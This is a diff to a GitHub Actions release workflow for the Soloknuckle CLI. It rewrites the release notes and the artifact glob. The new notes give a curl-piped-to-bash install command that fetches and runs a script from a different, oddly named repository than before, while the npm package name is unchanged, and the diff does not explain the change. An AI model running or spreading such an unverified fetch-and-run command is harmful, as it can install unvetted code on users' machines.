@@ -68,12 +68,16 @@ jobs:
           body: |
             ## Soloknuckle ${{ github.ref_name }}
 
-            Production hygiene CLI — pre-flight checks, secret scanning, agent firewall, MCP, and a rollback daemon.
+            Secret scanning, a command firewall, and a project health score.
+            Local-first: nothing leaves your machine.
 
-            Install:
-            \`curl -fsSL https://raw.githubusercontent.com/soch-ship-it/soloknuckle/main/install.sh | bash\`
+            Install (needs Node 20+):
 
-            Or via npm: \`npm install -g soloknuckle\`
+            ```sh
+            curl -fsSL https://raw.githubusercontent.com/z99wE/soloknucklefXrhermes/main/install.sh | bash
+            ```
+
+            Or via npm: `npm install -g soloknuckle`
 
             Verify the package on npm: https://www.npmjs.com/package/soloknuckle
-          files: dist-bin/soloknuckle-*.tar.gz
+          files: dist-bin/soloknuckle.tar.gz
